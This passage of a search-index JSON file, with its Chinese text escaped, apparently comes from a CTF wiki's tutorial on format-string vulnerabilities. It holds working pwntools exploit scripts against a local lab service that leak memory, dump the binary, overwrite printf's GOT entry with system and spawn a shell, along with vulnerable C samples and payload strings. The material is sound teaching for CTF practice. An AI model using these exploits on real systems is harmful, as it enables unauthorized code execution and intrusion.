\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002","title":"\u539f\u7406"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#1-","text":"\u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939 fmt_blind_stack \u4e2d\u3002","title":"\u4f8b\u5b50 1 - \u6cc4\u9732\u6808"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_32","text":"\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86 %p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f \u279c blind_fmt_stack git: ( master ) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% \u544a\u8bc9\u6211\u4eec flag \u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_33","text":"\u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b from pwn import * context . log_level = 'error' def leak ( payload ): sh = remote ( '127.0.0.1' , 9999 ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n ' , drop = True ) if data . startswith ( '0x' ): print p64 ( int ( data , 16 )) sh . close () i = 1 while 1 : payload = '% {} $p' . format ( i ) leak ( payload ) i += 1 \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230 flag //////// //////// \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x ff flag { thi s_is_fla g } \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x fe \\x 7f \\x 00 \\x 00","title":"\u5229\u7528"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#2-got","text":"\u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728 blind_fmt_got \u6587\u4ef6\u5939\u4e2d\u3002","title":"\u4f8b\u5b50 2 - \u76f2\u6253\u52ab\u6301 got"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_34","text":"\u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a 64 \u4f4d\u3002 \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_35","text":"\u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a 6\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#binary","text":"\u7531\u4e8e\u7a0b\u5e8f\u662f 64 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece 0x400000 \u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002 ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num += 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr += len ( data ) f . close () getbinary () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 payload \u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709 '\\n' \u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002","title":"\u6cc4\u9732 binary"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#binary_1","text":"\u5229\u7528 IDA \u6253\u5f00\u6cc4\u9732\u7684 binary \uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8f main \u51fd\u6570\u7684\u5730\u5740 seg000:00000000004005F6 push rbp seg000:00000000004005F7 mov rbp, rsp seg000:00000000004005FA add rsp, 0FFFFFFFFFFFFFF80h seg000:00000000004005FE seg000:00000000004005FE loc_4005FE: ; CODE XREF: seg000:0000000000400639\u0019j seg000:00000000004005FE lea rax, [ rbp-80h ] seg000:0000000000400602 mov edx, 80h ; '\u20ac' seg000:0000000000400607 mov rsi, rax seg000:000000000040060A mov edi, 0 seg000:000000000040060F mov eax, 0 seg000:0000000000400614 call sub_4004C0 seg000:0000000000400619 lea rax, [ rbp-80h ] seg000:000000000040061D mov rdi, rax seg000:0000000000400620 mov eax, 0 seg000:0000000000400625 call sub_4004B0 seg000:000000000040062A mov rax, cs:601048h seg000:0000000000400631 mov rdi, rax seg000:0000000000400634 call near ptr unk_4004E0 seg000:0000000000400639 jmp short loc_4005FE \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662f sub_4004C0 \u4e3a read \u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662f read \u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684 sub_4004B0 \u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a while 1 \u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002 **\u6ce8\u89e3\uff1a**\u8865\u5145\u4e00\u5f20\u56fe","title":"\u5206\u6790 binary"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_36","text":"\u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740\uff0c \u83b7\u53d6\u5bf9\u5e94 libc \u4ee5\u53ca system \u51fd\u6570\u5730\u5740 \u4fee\u6539 printf \u5730\u5740\u4e3a system \u51fd\u6570\u5730\u5740 \u8bfb\u5165 /bin/sh; \u4ee5\u4fbf\u4e8e\u83b7\u53d6 shell","title":"\u5229\u7528\u601d\u8def"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_37","text":"\u7a0b\u5e8f\u5982\u4e0b\u3002 ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context . arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num += 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr += len ( data ) f . close () ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote ( ip , port ) ## let the read get resolved sh . sendline ( 'a' ) sh . recv () ## get printf addr payload = '%00008$s' + 'STARTEND' + p64 ( read_got ) sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) . ljust ( 8 , ' \\x00 ' ) sh . recv () read_addr = u64 ( data ) ## get system addr libc = LibcSearcher ( 'read' , read_addr ) libc_base = read_addr - libc . dump ( 'read' ) system_addr = libc_base + libc . dump ( 'system' ) log . success ( 'system addr: ' + hex ( system_addr )) log . success ( 'read addr: ' + hex ( read_addr )) ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '% {} $' . format ( i ) new = '% {} $' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () ## get shell sh . sendline ( '/bin/sh;' ) sh . interactive () \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801 ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '% {} $' . format ( i ) new = '% {} $' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () fmtstr_payload \u76f4\u63a5\u5f97\u5230\u7684 payload \u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4 printf \u7684\u65f6\u5019 '\\x00' \u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools \u76ee\u524d\u6b63\u5728\u5f00\u53d1 fmt_payload \u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u9762 8 \u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9 payload \u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f offset = ( int )( math.ceil ( len ( payload ) / 8 .0 ) + 1 ) \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e '%order$hn' \u4e2d order \u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e 8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_38","text":"SuCTF2018 - lock2 \uff08\u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2\uff09","title":"\u9898\u76ee"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u7840\u5229\u7528 \u00b6 \u9605\u8bfb ctf-wiki \u540e\u603b\u7ed3 \u6cc4\u9732\u5185\u5b58 \u00b6 \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528 GOT \u8868\u5f97\u5230 libc \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6 libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83 libc \u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump \u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002 \u7b80\u5355\u7684\u6cc4\u9732\u6808\u5185\u5b58 \u00b6 \u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> # file:leakmemory.c int main () { char s [ 100 ]; int a = 1 , b = 0x22222222 , c = -1 ; scanf ( \"%s\" , s ); printf ( \"%08x.%08x.%08x.%s \\n \" , a , b , c , s ); printf ( s ); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e return 0 ; } 32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u6808\u4f20\u53c2\uff0c64 \u4f4d\u7cfb\u7edf\u524d 7 \u4e2a\u53c2\u6570\u662f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\u300232 \u4f4d\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u51fa\u5b58\u5728\u6808\u4e0a\u7684\u53c2\u6570\u3002\uff0864 \u4f4d\u8981\u5bf9\u5e94\u8c03\u6574\uff09 \u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f\uff1a gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c \u8f93\u5165\u8f93\u51fa\u5982\u4e0b\uff1a >>>%p.%p.%p 00000001 .22222222.ffffffff.%p.%p.%p 0xffffcd10.0xc2.0xf7e8b6bb \u6808\u60c5\u51b5\uff1a \u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" # \u5f00\u59cb\u6cc4\u9732\u4f4d\u7f6e 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\" \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u00b6 \u4e0a\u9762\u5df2\u7ecf\u5b9e\u73b0\u4f9d\u6b21\u83b7\u53d6\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff0c\u76f4\u63a5\u83b7\u53d6\u6307\u5b9a\u4e3a\u4f4d\u7f6e\u7684\u53c2\u6570\uff1a # \u7b2cn\u4e2a\u53c2\u6570 %n $p \u53ea\u8981\u77e5\u9053\u76ee\u6807\u6570\u636e\u5728\u6808\u4e0a\u7684\u504f\u79fb n \uff0c\u5c31\u80fd\u591f\u83b7\u53d6\u3002 \u5c0f\u603b\u7ed3 \u00b6 \u4f1a\u7528\u6765\u6cc4\u9732\u4ec0\u4e48 \u00b6 \u7406\u8bba\u4e0a\u4efb\u4f55\u6808\u4e0a\u6570\u636e\u90fd\u80fd\u88ab\u6cc4\u9732\u51fa\u6765\uff0c\u76ee\u524d\u9047\u5230\u8fc7\u7684\u6709\u4ee5\u4e0b\u8fd9\u4e9b\uff1a Canary \u6cc4\u9732\u51fa Canary \u7684\u503c\uff0c\u4ece\u800c\u7ed5\u8fc7 Canary \u4fdd\u62a4\u3002 text \u6bb5\u5730\u5740 \u6cc4\u9732\u51fa text \u6bb5\u7684\u771f\u5b9e\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7 PIE \u5bf9\u4e8e text \u6bb5\u7684\u4fdd\u62a4\uff0c\u4e3a ROP \u5b9e\u73b0\u63d0\u4f9b\u57fa\u7840\u3002 libc \u51fd\u6570\u5730\u5740 \u6cc4\u9732 libc \u51fd\u6570\u5730\u5740\uff0c\u83b7\u53d6 libc base addr \u3002\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u7528\u6765\u662f\u7ed5\u8fc7 PIE \u4fdd\u62a4\uff0c\u4f46\u6cc4\u9732 libc \u5730\u5740\u610f\u4e49\u4e0d\u6b62\u4e8e\u6b64\u3002 \u67d0\u4e9b\u53d8\u91cf \u6709\u4e9b\u9898\u76ee\u4f1a\u6709 if \u5224\u65ad\u8f93\u5165\u503c\u7b49\u662f\u5426\u4e0e\u9884\u5148\u8bbe\u5b9a\u7684\u503c\u76f8\u7b49\uff0c\u4ee5\u6b64\u589e\u52a0\u96be\u5ea6\u3002 \u5173\u952e\u5b57\u9009\u62e9 \u00b6 \u5229\u7528 %x \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528 %p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528 %s \u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528 %order x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order s \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002 \u8986\u76d6\u5185\u5b58 \u00b6 \u8986\u76d6\u5185\u5b58\u4f7f\u7528\u7684 %n \u548c %c \u914d\u5408\u5b9e\u73b0\u3002 c \u7b80\u5355\u70b9\u6765\u8bf4\u5c31\u662f\u4ea7\u751f\u51e0\u4e2a null \u5b57\u7b26\u3002 n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u5c06\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u5199\u5165\u7684\u65f6\u5019\u4e5f\u6709\u591a\u79cd\u65b9\u5f0f\uff1a n\uff1aint hn\uff1ashort int \u5199\u5165\u53cc\u5b57\u8282 hhn\uff1achar int \u5199\u5165\u5355\u5b57\u8282 \u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\uff0832\u4f4d\uff09\uff1a /* example/overflow/overflow.c */ #include <stdio.h> int a = 123 , b = 456 ; int main () { int c = 789 ; char s [ 100 ]; printf ( \"%p \\n \" , & c ); scanf ( \"%s\" , s ); printf ( s ); if ( c == 16 ) { puts ( \"modified c.\" ); } else if ( a == 2 ) { puts ( \"modified a for a small number.\" ); } else if ( b == 0x12345678 ) { puts ( \"modified b for a big number!\" ); } return 0 ; } \u8986\u76d6\u4efb\u610f\u5730\u5740 \u00b6 \u8986\u76d6\u5c0f\u6570\u5b57 \u00b6 \u8fd9\u91cc\u4ee5\u5c06 a \u8986\u76d6\u4e3a 2 \u4e3a\u4f8b\u3002\u9700\u8981\u5c06\u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u540e\u7f6e\uff0c\u56e0\u4e3a\u673a\u5668\u5b57\u957f\u4e3a 4 \uff0864 \u4f4d\u662f 8\uff09\u3002 \u6784\u9020\u5b57\u7b26\u4e32\u5982\u4e0b\uff1a aa%k$nxx[addr] aa \u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u6240\u4ee5\u6700\u540e\u4f1a\u5411\u76ee\u6807\u5730\u5740\u5199\u5165 2 \u3002 k \u76ee\u6807\u5730\u5740\u7684\u504f\u79fb\u4f4d\u7f6e\u3002 xx \u8ba9\u5b57\u7b26\u4e32\u5bf9\u5176\u673a\u5668\u5b57\u957f\uff0c\u8fd9\u91cc\u662f 4 \u3002 [addr] \u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u3002 \u600e\u4e48\u5bf9\u9f50 \u00b6 \u5bf9\u9f50\u65b9\u6cd5\u5728 32 64 \u7a0b\u5e8f\u4e2d\uff0c\u8986\u76d6\u5927\u6570\u5b57\u3001\u5c0f\u6570\u5b57\u4e2d\u90fd\u901a\u7528\uff0c\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4e3a\u4f8b\u3002python \u4f7f\u7528 len \u8ba1\u7b97\u957f\u5ea6\u540e\uff0c\u7528\u673a\u5668\u5b57\u957f\u53d6\u4f59\uff0c\u4f59\u6570\u5c31\u662f\u5bf9\u9f50\u957f\u5ea6\u3002 # 32\u4f4d\u673a\u5668\u5b57\u957f\uff1a4 # 64\u4f4d\u673a\u5668\u5b57\u957f\uff1a8 >>> len ( \"aa%k$n\" ) % 4 2 \u7b2c\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u504f\u79fb\u662f 6 \uff0c aa%k$nxx \u957f\u5ea6\u4e3a 8 \uff08\u4e0d\u4f1a\u7b97\u5c31 python len\uff09\uff0c\u6240\u4ee5 k \u504f\u79fb\u5e94\u8be5\u662f 8 \u3002 \u6784\u9020\u8986\u76d6\u5c0f\u6570\u5b57\u5229\u7528\u4ee3\u7801\uff1a def fora (): sh = process ( './overwrite' ) a_addr = 0x0804A024 payload = 'aa%8$naa' + p32 ( a_addr ) sh . sendline ( payload ) print sh . recv () sh . interactive () \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b >>>python exploit.py 0xffc1729c aaaa$\\xa0\\x0modified a for a small number. \u8986\u76d6\u5927\u6570\u5b57 \u00b6 \u8986\u76d6\u57fa\u672c\u7ed3\u6784\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u662f\u901a\u5e38\u662f\u8986\u76d6\u5927\u6570\u5b57\u4f1a\u5206\u6b21\u8986\u76d6\uff0c\u907f\u514d\u4e00\u4e0b\u6570\u636e\u592a\u5927\u800c\u4e0d\u6210\u529f\uff0c\u6240\u4ee5\u4f1a\u7528\u5230\u6807\u5fd7 hhn \u6216 hn \u3002 \u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u4f8b\u9898\uff0c\u5199\u5165\u7684\u76ee\u6807\u5730\u5740\u4e3a 0x0804A028 \u3002\u4f7f\u7528\u5355\u5b57\u8282\u5199\u5165\uff08hhn\uff09\uff0c\u5199\u5165\u503c\u4e3a 0x12345678 